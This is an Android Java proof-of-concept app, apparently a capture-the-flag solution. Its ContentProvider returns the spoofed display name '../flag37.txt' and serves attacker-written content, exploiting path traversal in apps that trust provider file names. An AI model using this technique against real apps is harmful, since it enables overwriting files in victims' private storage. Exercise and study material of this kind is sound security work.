package com.bedo.poc_app;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.provider.OpenableColumns;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class FileProvider extends ContentProvider {
    public FileProvider() {
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        MatrixCursor cursor = new MatrixCursor(new String[]{
                OpenableColumns.DISPLAY_NAME,
                OpenableColumns.SIZE
        });
        cursor.addRow(new Object[] {"../flag37.txt", 1337});
        return cursor;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) {
        try {
            // بنكريت ملف مؤقت جواه كلمة give flag
            File tempFile = new File(getContext().getCacheDir(), "exploit.txt");
            FileOutputStream fos = new FileOutputStream(tempFile);
            fos.write("give flag".getBytes());
            fos.close();
            return ParcelFileDescriptor.open(tempFile, ParcelFileDescriptor.MODE_READ_ONLY);
        } catch (IOException e) {
            return null;
        }
    }
    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        // Implement this to handle requests to delete one or more rows.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public String getType(Uri uri) {
        // TODO: Implement this to handle requests for the MIME type of the data
        // at the given URI.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        // TODO: Implement this to handle requests to insert a new row.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public boolean onCreate() {
        // TODO: Implement this to initialize your content provider on startup.
        return false;
    }



    @Override
    public int update(Uri uri, ContentValues values, String selection,
                      String[] selectionArgs) {
        // TODO: Implement this to handle requests to update one or more rows.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}